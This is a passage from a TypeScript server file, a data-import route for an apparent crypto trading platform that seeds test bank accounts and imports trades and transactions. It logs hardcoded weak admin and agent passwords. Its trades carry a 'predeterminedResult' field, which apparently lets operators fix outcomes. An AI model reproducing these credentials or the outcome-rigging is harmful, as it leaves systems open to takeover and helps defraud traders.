        { id: 1, userId: 3, bankName: 'Bangkok Bank', accountNumber: '1234567890', accountName: 'Test User 1', isActive: 1 },
        { id: 2, userId: 4, bankName: 'Kasikorn Bank', accountNumber: '0987654321', accountName: 'Test User 2', isActive: 1 },
        { id: 3, userId: 5, bankName: 'SCB Bank', accountNumber: '1122334455', accountName: 'Test User 3', isActive: 1 }
      ]).onConflictDoNothing();
      
      // Read and import JSON data
      console.log('📥 Reading JSON data files...');
      let tradesData = [];
      let transactionsData = [];
      
      try {
        tradesData = JSON.parse(fs.readFileSync('./data/trades.json', 'utf8'));
      } catch (error) {
        console.log('No trades.json file found, skipping trades import');
      }
      
      try {
        transactionsData = JSON.parse(fs.readFileSync('./data/transactions.json', 'utf8'));
      } catch (error) {
        console.log('No transactions.json file found, skipping transactions import');
      }
      
      if (tradesData.length > 0) {
        console.log('📥 Importing trades from JSON...');
        const tradesForImport = tradesData.map((trade: any, index: number) => ({
          id: 21 + index,
          userId: 7,
          cryptoId: trade.symbol || trade.cryptoId,
          entryPrice: trade.entryPrice,
          amount: trade.amount,
          direction: trade.direction,
          duration: trade.duration,
          profitPercentage: trade.profitPercentage || '0',
          createdAt: new Date(trade.createdAt).toISOString(),
          status: trade.status,
          result: trade.result || null,
          predeterminedResult: trade.predeterminedResult || null,
          endTime: trade.endTime ? new Date(trade.endTime).toISOString() : null,
          closedAt: trade.updatedAt ? new Date(trade.updatedAt).toISOString() : null
        }));
        
        await db.insert(trades).values(tradesForImport).onConflictDoNothing();
      }
      
      if (transactionsData.length > 0) {
        console.log('📥 Importing transactions from JSON...');
        const transactionsForImport = transactionsData.map((transaction: any, index: number) => ({
          id: 2 + index,
          userId: 7,
          type: transaction.type,
          amount: transaction.amount,
          method: transaction.method,
          status: transaction.status || 'completed',
          createdAt: new Date(transaction.createdAt || Date.now()).toISOString(),
          updatedAt: new Date(transaction.updatedAt || Date.now()).toISOString()
        }));
        
        await db.insert(transactions).values(transactionsForImport).onConflictDoNothing();
      }
      
      // Get summary
      const userCount = await db.select().from(users);
      const settingsCount = await db.select().from(settings);
      const bankAccountsCount = await db.select().from(bankAccounts);
      const tradesCount = await db.select().from(trades);
      const transactionsCount = await db.select().from(transactions);
      
      const summary = {
        users: userCount.length,
        settings: settingsCount.length,
        bankAccounts: bankAccountsCount.length,
        trades: tradesCount.length,
        transactions: transactionsCount.length,
        adminUsers: userCount.filter((user: any) => user.role === 'admin' || user.role === 'agent')
      };
      
      console.log('✅ Data import completed successfully!');
      console.log('📊 Import Summary:', summary);
      console.log('👤 Admin Credentials: admin/admin123');
      console.log('👤 Agent Credentials: agent001/agent123');
      
      res.json({ success: true, message: 'Data imported successfully', summary });
      
    } catch (error) {
      console.error('❌ Error importing data:', error);
      res.status(500).json({ success: false, message: 'Import failed', error: (error as Error).message });
    }
  });

  // Register settings routes
  registerSettingsRoutes(app);

  const httpServer = createServer(app);

  return httpServer;
}
